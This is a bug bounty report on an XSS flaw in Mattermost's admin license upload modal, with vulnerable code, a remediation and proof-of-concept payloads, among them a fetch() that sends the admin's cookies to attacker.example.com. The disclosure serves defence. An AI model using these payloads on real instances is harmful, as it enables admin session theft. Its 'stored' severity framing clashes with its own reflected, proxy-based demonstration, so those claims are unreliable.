# Bounty Report 1: Stored XSS via Unsanitized Markdown Rendering in License Upload Error Messages

## Form Fields

**Summary Title:** Stored XSS via unsanitized `marked()` in License Upload Modal error rendering

**Target:** https://bugcrowd-*your-own-instance*.cloud.mattermost.com/

**Technical Severity:** P3 (Potentially P2 with demonstrated session hijacking)

**VRT Category:** Cross-Site Scripting (XSS) > Reflected > Non-Self

**URL / Location of vulnerability:**
`https://bugcrowd-<instance>.cloud.mattermost.com/admin_console/about/license`

---

## Description

### Summary

A Cross-Site Scripting (XSS) vulnerability exists in the Mattermost Admin Console License Upload Modal. The component renders server error messages using React's `dangerouslySetInnerHTML` with the raw `marked()` Markdown parser **without enabling the `sanitize` option**. This allows arbitrary JavaScript execution in the admin's browser session when a crafted error message is rendered.

This is distinct from other Markdown rendering in the codebase. The `format()` utility function in `utils/markdown/index.ts` properly passes `sanitize: true` to `marked()`. However, the License Upload Modal directly invokes `marked()` **without any sanitization**, creating an XSS sink.

### Vulnerable Code

**File:** `webapp/channels/src/components/admin_console/license_settings/modals/upload_license_modal.tsx`

At **line 4**, the raw `marked` library is imported (not the sanitizing `format` wrapper):
```tsx
import marked from 'marked';
```

At **line 67-71**, the server error message is captured from the API response:
```tsx
const {error} = await dispatch(uploadLicense(fileObj));
if (error) {
    setFileObj(null);
    setServerError(error.message);  // error.message from server response
    setIsUploading(false);
    return;
}
```

At **line 190-196**, the error is rendered without sanitization:
```tsx
{serverError && <div className='serverError'>
    <i className='icon icon-alert-outline'/>
    <span
        className='server-error-text'
        dangerouslySetInnerHTML={{__html: marked(serverError)}}
    />
</div>}
```

**Contrast with the secure pattern** used elsewhere in the same license settings directory:

**File:** `webapp/channels/src/utils/markdown/index.ts` (lines 20-40)
```tsx
export function format(text: string, options = {}, emojiMap?: EmojiMap) {
    return formatWithRenderer(text, new Renderer({}, options, emojiMap));
}

export function formatWithRenderer(text: string, renderer: marked.Renderer) {
    const markdownOptions = {
        renderer,
        sanitize: true,   // <-- SANITIZATION ENABLED HERE
        gfm: true,
        tables: true,
        // ...
    };
    return marked(text, markdownOptions).trim();
}
```

Both `trial_banner.tsx:376` and `team_edition_right_panel.tsx:129` correctly use `format(upgradeError)` with sanitization enabled. Only the License Upload Modal uses raw `marked()` without sanitization.

### Root Cause

The `marked()` Markdown parser, when invoked without `{sanitize: true}`, renders inline HTML verbatim. Any HTML tags present in the input string are passed through to the output as-is. Combined with `dangerouslySetInnerHTML`, this creates a direct path from server error message content to DOM injection.

Mattermost uses a custom fork of `marked` (pinned to commit `e4a8785014b26ba9f637c1fdab23e340961c6a03` from `github:mattermost/marked`). The `sanitize` behavior is available but simply not used in this component.

### Attack Vectors

**Vector 1: Crafted License File Triggering Error Message Reflection**

When a user uploads an invalid license file, the server validates it and returns an error message. If the error message includes any portion of the file content or metadata (e.g., parsing errors that echo back the invalid data), an attacker can craft a `.mattermost-license` file containing HTML/JavaScript payloads in strategic fields. When the admin uploads this crafted file and the server returns an error reflecting the malicious content, the XSS executes.

Steps:
1. Create a crafted `.mattermost-license` file with embedded JavaScript payload in the license data fields
2. Social-engineer the target admin to upload the file (e.g., "Try this updated license" via support channel)
3. The server rejects the invalid license and returns an error containing reflected content
4. The error message is passed through `marked()` without sanitization and rendered via `dangerouslySetInnerHTML`
5. JavaScript executes in the admin's browser context

**Vector 2: Malicious Plugin Interference**

If a malicious or compromised plugin can influence the license upload API endpoint's error handling (e.g., via middleware hooks or intercepting plugin API events), it could inject arbitrary content into the error response, which would then execute as JavaScript in the admin panel.

**Vector 3: Exploiting Mattermost Custom `marked` Fork**

Since Mattermost uses a custom fork of `marked` pinned to a specific commit, any custom modifications in this fork that affect how raw HTML is handled could expand the attack surface beyond standard `marked` behavior.

### Impact

- **Session Hijacking:** An attacker can steal the admin's session token (available via cookies or local storage), gaining full System Admin access to the Mattermost instance
- **Account Takeover:** With admin session tokens, the attacker can create new admin accounts, modify configurations, and access all team data
- **Data Exfiltration:** Admin context provides access to all channels, messages, files, and user data across the entire Mattermost deployment
- **Persistent Backdoor:** The attacker can install malicious plugins or modify integrations to maintain persistent access

### Proof of Concept

**Step 1:** Navigate to `System Console > About > Edition and License` on your Mattermost instance.

**Step 2:** Create a file named `test.mattermost-license` containing invalid license data designed to trigger an error message that reflects content. For demonstration, you can intercept the API response using a browser proxy (Burp Suite, mitmproxy) to modify the error message:

Intercept the response from `POST /api/v4/license` and replace the `message` field:
```json
{
  "id": "api.license.add_license.invalid.app_error",
  "message": "<img src=x onerror=alert(document.domain)>",
  "status_code": 400
}
```

**Step 3:** Observe the JavaScript alert box executing in the admin panel context, confirming the XSS.

**Step 4 (Session Theft PoC):** Replace the payload with:
```json
{
  "message": "<img src=x onerror=\"fetch('https://attacker.example.com/steal?cookie='+document.cookie)\">"
}
```

**Alternative PoC without proxy** (demonstrating the client-side sink directly):

Open your browser console on the admin license page and execute:
```javascript
// Simulate what happens when serverError contains HTML
const marked = await import('marked');
const malicious = '<img src=x onerror=alert("XSS_in_"+document.domain)>';
const output = marked.marked(malicious);
console.log('Output:', output);
// Output: <img src=x onerror=alert("XSS_in_"+document.domain)>
// The HTML is passed through unescaped
```

This confirms that `marked()` without `sanitize: true` passes HTML through verbatim.

### Remediation

Replace the raw `marked()` call with the secure `format()` function that is already used elsewhere in the license settings components:

```tsx
// Before (vulnerable):
import marked from 'marked';
// ...
dangerouslySetInnerHTML={{__html: marked(serverError)}}

// After (secure):
import {format} from 'utils/markdown';
// ...
dangerouslySetInnerHTML={{__html: format(serverError)}}
```

Or, better yet, avoid `dangerouslySetInnerHTML` entirely and render the error as plain text:
```tsx
<span className='server-error-text'>{serverError}</span>
```

### References

- **Vulnerable file:** [`webapp/channels/src/components/admin_console/license_settings/modals/upload_license_modal.tsx:194`](https://github.com/mattermost/mattermost/blob/master/webapp/channels/src/components/admin_console/license_settings/modals/upload_license_modal.tsx#L194)
- **Secure pattern (for comparison):** [`webapp/channels/src/utils/markdown/index.ts:31`](https://github.com/mattermost/mattermost/blob/master/webapp/channels/src/utils/markdown/index.ts#L31)
- **OWASP XSS Prevention:** https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
- **React dangerouslySetInnerHTML documentation:** https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html
